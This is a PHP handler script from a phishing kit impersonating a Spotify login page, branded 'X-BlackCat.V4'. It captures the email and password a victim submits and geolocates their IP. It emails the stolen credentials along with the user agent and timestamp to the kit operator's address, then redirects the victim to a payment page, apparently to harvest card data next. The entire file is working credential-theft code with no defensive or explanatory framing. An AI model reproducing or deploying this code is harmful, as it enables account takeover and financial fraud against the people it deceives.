<?php 
include "./block-ip/bots.php";  
include "./block-ip/opciones.php";
date_default_timezone_set('UTC');
	$Anon = rand(99999999, 999999999999999999999);
	$Isma = md5(date('l jS \of F Y h:i:s A'));
	$x = "_";
	$z = "=";
	$ip          = $_SERVER['REMOTE_ADDR'];
	$details     = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$ip."");
	$negara      = $details->geoplugin_countryCode;
	$nama_negara = $details->geoplugin_countryName;
	$kode_negara = strtolower($negara);
session_start();
date_default_timezone_set("Africa/Morocco");
include('__MonEmail.php');
$rand = $_GET['dispatch'];

{
{
$hostname = gethostbyaddr($ip);
$userag = $_SERVER['HTTP_USER_AGENT']; 
$date = date('d-m-Y', time());
$time = date('H:i:s', time());
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "#################################################\n";
$message .= "===========|+|LOGIN INFOS|+|===========\n";
$message .= "user  : ".$_POST['Email']."\n";
$message .= "Password  : ".$_POST['Password']."\n";
$message .= "===========|+|INFOS PC & IP|+|===========\n";
$message .= "TIME = ".$time."\n";
$message .= "DATE = ".$date."\n";
$message .= "USER = ".$userag."\n";
$message .= "IP	: http://www.geoiptool.com/?IP=$ip\n";
$message .= "===========|+|X-Black Cat|+|===========\n";
$message .= "#################################################\n";


include '__MonEmail.php';
$subject = "SPOTIFY Login  [$ip]";
$headers = "From: X-BlackCat.V4";


mail($to, $subject, $message,$headers);
}

header("Location:payment.php?SessionID-xb=$negara.$z.$Anon.$x.$Isma.$z.$nama_negara");
}
?>

